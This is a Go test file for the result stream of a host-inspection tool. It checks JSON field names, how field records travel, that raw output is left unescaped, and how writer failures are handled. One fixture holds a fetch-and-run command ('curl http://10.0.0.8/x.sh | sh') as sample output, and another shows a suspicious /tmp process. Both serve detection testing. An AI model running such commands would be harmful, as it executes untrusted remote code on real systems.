// The result stream's own tests: the line's shape (the field names are the
// contract), that a target's text travels as it is, and that a stream which
// cannot be written says so instead of ending silently.

package collect

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"karma/internal/model"
	"karma/internal/runner"
	"karma/internal/session"
)

// fixtureCatalog is one check per way a walk can end: an answered body with a
// rule that lights a line, a walk whose only tier the host lacks, a tier that
// answers with nothing at all, and a tier that answers with fields.
func fixtureCatalog() []*model.Check {
	answer := func(text string) model.Native {
		return model.Native{Body: func(context.Context) (string, error) { return text, nil }}
	}
	unavailable := model.Native{Body: func(context.Context) (string, error) { return "", model.ErrTierUnavailable }}
	return []*model.Check{
		{
			ID: "answered", Title: "Answered", Aspect: model.AspectSystem, Platform: model.Linux,
			Steps: []model.Step{{{Label: "ss", Inv: answer("== a\none two three\n")}}},
			Rules: []model.Matcher{model.NewRule("two", `two`, model.High, "a two")},
		},
		{
			ID: "absent", Title: "Absent", Aspect: model.AspectKernel, Platform: model.Linux,
			Steps: []model.Step{{{Label: "gone", Inv: unavailable}}},
		},
		{
			ID: "quiet", Title: "Quiet", Aspect: model.AspectLog, Platform: model.Linux,
			Steps: []model.Step{{{Label: "quiet", Inv: answer("")}}},
		},
		{
			// A tier that reads fields: the records travel as data, and the
			// readable rendering is derived on the far side.
			ID: "fields", Title: "Fields", Aspect: model.AspectProcess, Platform: model.Linux,
			Steps: []model.Step{{{Label: "ps", Inv: fieldsTier()}}},
			Rules: []model.Matcher{
				model.NewJudged("temp-path", model.Medium, "temp path in the command line",
					model.FieldHas{Fields: []string{"COMMAND"}, Sub: "/tmp/"}),
			},
		},
	}
}

// fieldsTier is a tier whose body reads fields: two processes, one of them a
// finding for the rule that reads the COMMAND column.
func fieldsTier() model.Fields {
	return model.Fields{Read: func(context.Context) (*model.RecordSet, error) {
		row := func(user, pid, command string) model.Record {
			return model.Record{Fields: []model.Field{
				{Name: "USER", Value: user}, {Name: "PID", Value: pid}, {Name: "COMMAND", Value: command},
			}}
		}
		return &model.RecordSet{
			Header: []string{"USER", "PID", "COMMAND"},
			Rows: []model.Record{
				row("root", "1", "/sbin/init"),
				row("www-data", "2210", "/bin/sh /tmp/x"),
			},
		}, nil
	}}
}

// runOnce runs one catalog once, with the observer given.
func runOnce(t *testing.T, catalog []*model.Check, observer runner.Observer) {
	t.Helper()
	options := model.RunOptions{Concurrency: 4, Timeout: 5 * time.Second}
	summary := runner.RunCatalog(context.Background(), session.LocalSession{}, catalog, options, observer)
	if summary.Results != len(catalog) {
		t.Fatalf("the run produced %d results, want %d", summary.Results, len(catalog))
	}
}

func TestTheStreamNamesEveryFieldOfAResult(t *testing.T) {
	line, err := Of(&model.CheckResult{
		Check:         &model.Check{ID: "listen"},
		ProbeLabel:    "ss",
		SkippedLabels: []string{"ss"},
		Outcome:       model.Collected,
		Raw:           "== a\none\n",
		Stderr:        "a warning\n",
		Note:          "exit code 1",
		Document:      model.Document{Truncated: true},
	}).Line()
	if err != nil {
		t.Fatalf("the line could not be built: %v", err)
	}
	want := `{"check":"listen","outcome":"collected","probe":"ss","skipped":["ss"],` +
		`"raw":"== a\none\n","stderr":"a warning\n","note":"exit code 1","truncated":true}` + "\n"
	if string(line) != want {
		t.Errorf("the line is\n%s\nwant\n%s", line, want)
	}
}

// A tier that read fields states them as data, once: the readable lines are
// derived on the far side rather than sent beside them.
func TestAFieldsTierTravelsAsData(t *testing.T) {
	var stream bytes.Buffer
	runOnce(t, fixtureCatalog(), NewWriter(&stream))
	var found bool
	for _, raw := range strings.Split(strings.TrimSpace(stream.String()), "\n") {
		var result Result
		if err := json.Unmarshal([]byte(raw), &result); err != nil {
			t.Fatalf("the stream withholds a line: %v", err)
		}
		if result.Check != "fields" {
			continue
		}
		found = true
		if result.Raw != "" {
			t.Errorf("fields should not also travel as text: %q", result.Raw)
		}
		if result.Fields == nil ||
			!slices.Equal(result.Fields.Header, []string{"USER", "PID", "COMMAND"}) ||
			len(result.Fields.Rows) != 2 {
			t.Fatalf("the fields did not travel: %+v", result.Fields)
		}
	}
	if !found {
		t.Fatal("the fields check is missing from the stream")
	}
}

// A target's own output travels as it is: the angles and ampersands a shell
// pipeline prints are not JSON escapes.
func TestTheLineKeepsTheTextAsItIs(t *testing.T) {
	line, err := Of(&model.CheckResult{
		Check:   &model.Check{ID: "shell-rc"},
		Outcome: model.Collected,
		Raw:     "curl http://10.0.0.8/x.sh | sh && echo <done>\n",
	}).Line()
	if err != nil {
		t.Fatalf("the line could not be built: %v", err)
	}
	if !strings.Contains(string(line), "&& echo <done>") {
		t.Errorf("the text should travel unescaped, got %s", line)
	}
}

// A stream whose writer fails stops: the first error is kept and reported, and
// no line after it is written.
type failingWriter struct {
	mu    sync.Mutex
	lines int
}

var errStreamClosed = errors.New("the stream is gone")

func (w *failingWriter) Write(p []byte) (int, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.lines++
	return 0, errStreamClosed
}

func TestAWriterThatFailsEndsTheStream(t *testing.T) {
	target := &failingWriter{}
	writer := NewWriter(target)
	runOnce(t, fixtureCatalog(), writer)
	if !errors.Is(writer.Err(), errStreamClosed) {
		t.Fatalf("the run should report the failed stream, got %v", writer.Err())
	}
	if target.lines != 1 {
		t.Fatalf("writes after the first failure are pointless, got %d writes", target.lines)
	}
}

// The damaged path names the check: a check whose presentation broke is a failed
// result in the stream, not a check that never arrives.
func TestDamagedWritesAFailedResult(t *testing.T) {
	var stream bytes.Buffer
	writer := NewWriter(&stream)
	writer.Damaged(&model.Check{ID: "boom"}, errors.New("presentation: the writer blew up"))
	var line Result
	if err := json.Unmarshal(stream.Bytes(), &line); err != nil {
		t.Fatalf("the line could not be read: %v", err)
	}
	if line.Check != "boom" || line.Outcome != model.Failed.String() ||
		!strings.Contains(line.Note, "the writer blew up") {
		t.Fatalf("a damaged check came out as %+v", line)
	}
}
